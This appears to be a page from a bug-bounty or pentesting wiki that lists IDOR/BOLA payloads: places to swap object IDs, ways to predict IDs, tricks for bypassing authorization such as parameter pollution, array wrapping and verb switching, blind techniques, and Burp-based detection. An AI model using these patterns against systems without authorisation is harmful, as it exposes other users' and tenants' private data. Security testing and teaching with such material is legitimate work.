---
title: "Payloads: IDOR / BOLA"
type: payloads
tags: [payloads, idor, bola, access-control, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-06-16
---

# Payloads: IDOR / BOLA

Object-reference tampering (OWASP A01). Routed via the `hunt-idor` skill. See [[access-control]]; API variant [[api-security]] (payloads `wiki/payloads/api.md`).

## ID locations to swap
```
URL path:   /api/users/1001 -> 1002        /invoice/1002.pdf
query:      ?id=1002  ?user=1002  ?account=1002  ?file=...
body:       {"id":1002}  {"userId":1002}
header:     X-Account-Id: 1002  X-User-Id  Referer  Cookie role/uid
JWT claim:  decode -> change sub/uid/role -> (see jwt)
```

## ID formats / predict
```
sequential int: 1000,1001,...           negative / 0 / very large
UUID: leak elsewhere (other endpoint, response, email) then reuse
hashid/base64: decode (echo ID|base64 -d), increment, re-encode
MD5(id)/predictable hash: precompute for victim id
GUID v1: time-based, partially predictable
```

## Bypass authorization checks
```
wrap in array:   id=1002 -> id[]=1002        {"id":["self","1002"]}
param pollution: id=self&id=1002             ?id=1002&id=self
add a param:     ?id=1002&admin=true
verb/version:    GET /user/1002 blocked -> try POST/PUT; /api/v1 vs /api/v2 vs /internal
path tricks:     /user/1002/../1002   /user/%31%30%30%32   //user/1002
mass assign:     add fields {"owner":"me","userId":1002}
content-type:    swap json<->form to change parser/authz
```

## Blind / second-order
```
action you can't read: POST a change to victim's object, verify via a side channel
export/report/email that includes other users' data (set recipient=victim, id=victim)
GraphQL: query node(id:"victim") / batch many ids in one request
```

## Detect at scale
```
Burp: Autorize / AuthMatrix (replay each request as user B, diff)
note 2 accounts' ids -> swap A<->B systematically across every object endpoint
```

## Real-world
BOLA is OWASP API #1 and the single most common high-bounty web bug: sequential/UUID id swap on `/api/.../{id}` leaking other users' or cross-tenant data (Optus, countless H1 reports).
